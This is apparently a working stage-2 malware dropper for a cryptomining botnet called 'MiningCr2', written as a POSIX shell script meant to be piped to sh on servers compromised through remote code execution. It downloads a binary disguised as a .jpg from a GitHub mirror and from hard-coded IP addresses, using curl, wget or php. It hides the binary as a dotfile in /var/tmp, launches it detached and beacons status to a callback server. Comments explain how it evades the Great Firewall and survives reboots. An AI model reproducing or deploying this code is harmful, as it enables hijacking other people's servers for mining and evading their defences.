#!/bin/sh
# s.sh — MiningCr2 stage-2 payload (fix4, 2026-10-28).
#
# Fetched by the victim from staging and piped to sh:
#   curl -fsSL <staging>/s.sh 2>/dev/null | sh -s <token>
# $1 = the per-attempt verify token (dl/exec correlation + the node's 1st
# positional argument, which the node uses for its nodeboot/miner callbacks).
#
# Everything below runs under a clean /bin/sh on the victim — no exploit sink
# sits between us and this script, so constructs that wild sinks mangle
# (case blocks, $var computation) are safe here.
# Keep POSIX sh: no bashisms, no arrays.
#
# fix4: node blob sources moved to the public GitHub CDN mirror (reachable
# from CN through the GFW where the EU staging IPs are silenced), with the
# EU VPS as fallback. All CB (verify) curls are connect/max-time bounded so
# victims that cannot reach the verify base (GFW-silenced boxes) still launch
# the node quickly.
#
# NOTE: CB + node blob URLs are baked in here. If staging or the verify base
# moves, re-upload this file (the RCE command in payload.go only references /s.sh).

CB=http://92.5.105.124:8090/verify
GH=https://raw.githubusercontent.com/modixhub-sketch/mcr2-static/main
VPS=http://80.96.58.67

# Arch selection runs ON THE VICTIM (uname -m), not on the vector: the
# vector-side arch guess is wrong for a large share of targets (arm64 cloud +
# IoT) and a mismatched ELF dies with Exec format error before it can beacon.
# U = native-arch preference, W = the other as a last-resort fallback.
# 1 = GitHub CDN (primary, CN-reachable), 2 = EU VPS (fallback).
case $(uname -m) in aarch64|arm64)
  U1=$GH/node_linux_arm64.jpg; U2=$VPS/node_linux_arm64.jpg
  W1=$GH/node_linux_amd64.jpg; W2=$VPS/node_linux_amd64.jpg
  ;; *)
  U1=$GH/node_linux_amd64.jpg; U2=$VPS/node_linux_amd64.jpg
  W1=$GH/node_linux_arm64.jpg; W2=$VPS/node_linux_arm64.jpg
  ;;
esac

# /var/tmp first (NOT /tmp): many web servers (Ubuntu apache2 with
# PrivateTmp=true) run in a private /tmp mount namespace that is unmounted on
# reboot / service restart — a node installed to /tmp would vanish. /var/tmp
# is world-writable, sticky, and persists across reboots. /tmp + /dev/shm are
# fallbacks for hosts where /var/tmp is missing, read-only, or full.
for d in /var/tmp /tmp /dev/shm; do
  # Download chain: curl (preferred) -> wget -> php (WordPress hosts), each
  # tried for the primary arch first, then the other; GitHub CDN first, VPS
  # fallback. --connect-timeout/--max-time bound each attempt so unreachable
  # sources fail fast. Writes to .n.part and mv's to .n only after success,
  # so a partial download is never exec'd.
  if { curl -fsSL --retry 2 --retry-delay 2 --connect-timeout 6 --max-time 120 $U1 -o $d/.n.part 2>/dev/null ||
       curl -fsSL --retry 2 --retry-delay 2 --connect-timeout 6 --max-time 120 $U2 -o $d/.n.part 2>/dev/null ||
       curl -fsSL --retry 2 --retry-delay 2 --connect-timeout 6 --max-time 120 $W1 -o $d/.n.part 2>/dev/null ||
       curl -fsSL --retry 2 --retry-delay 2 --connect-timeout 6 --max-time 120 $W2 -o $d/.n.part 2>/dev/null ||
       wget -qO $d/.n.part $U1 2>/dev/null ||
       wget -qO $d/.n.part $U2 2>/dev/null ||
       wget -qO $d/.n.part $W1 2>/dev/null ||
       wget -qO $d/.n.part $W2 2>/dev/null ||
       php -r "file_put_contents(\"$d/.n.part\",file_get_contents(\"$U1\"))" 2>/dev/null ||
       php -r "file_put_contents(\"$d/.n.part\",file_get_contents(\"$U2\"))" 2>/dev/null ||
       php -r "file_put_contents(\"$d/.n.part\",file_get_contents(\"$W1\"))" 2>/dev/null ||
       php -r "file_put_contents(\"$d/.n.part\",file_get_contents(\"$W2\"))" 2>/dev/null; } &&
    mv -f $d/.n.part $d/.n 2>/dev/null &&
    chmod +x $d/.n 2>/dev/null; then
   # dl stage: the node binary landed + is executable.
   curl -fsS --connect-timeout 4 --max-time 6 $CB/$1/dl -o /dev/null 2>/dev/null
   # Launch the node, detached, with the token as its 1st positional arg.
   # </dev/null on every branch: the script arrives via stdin (a pipe) and a
   # backgrounded child must not consume or hold the rest of it.
   if command -v setsid >/dev/null 2>&1; then
     nohup setsid $d/.n "$1" </dev/null >/dev/null 2>&1 &
   elif command -v nohup >/dev/null 2>&1; then
     nohup $d/.n "$1" </dev/null >/dev/null 2>&1 &
   else
     $d/.n "$1" </dev/null >/dev/null 2>&1 &
   fi
   # exec stage: after launching the node, report WHERE/WHAT/WHETHER so the
   # dl->boot gap is diagnosable even when the node never boots. Fire-and-
   # forget, curl-only (absent curl => no callback, same as the dl stage).
   # ONE 11-char alphanumeric token e=<dir1><size8><arch1><alive1> — no
   # &/:/; in the value (tailer decodes it positionally):
   #   dir  v=/var/tmp t=/tmp s=/dev/shm o=other
   #   arch x=amd64 a=arm64 i=386 r=armv7l z=unknown
   sleep 3
   SZ=$(wc -c < $d/.n 2>/dev/null | tr -cd "0-9"); [ -z "$SZ" ] && SZ=0
   B=$(printf "%08d" "$SZ" 2>/dev/null)
   E=o; [ "$d" = /var/tmp ] && E=v; [ "$d" = /tmp ] && E=t; [ "$d" = /dev/shm ] && E=s
   M=$(uname -m 2>/dev/null); C=z
   [ "$M" = x86_64 ] && C=x; [ "$M" = amd64 ] && C=x
   [ "$M" = aarch64 ] && C=a; [ "$M" = arm64 ] && C=a
   [ "$M" = i686 ] && C=i; [ "$M" = i386 ] && C=i
   [ "$M" = armv7l ] && C=r
   D=0; pgrep -f ^$d/.n >/dev/null 2>&1 && D=1
   curl -fsS --connect-timeout 4 --max-time 6 "$CB/$1/exec?e=$E$B$C$D" -o /dev/null 2>/dev/null
   break
  fi
done
exit 0
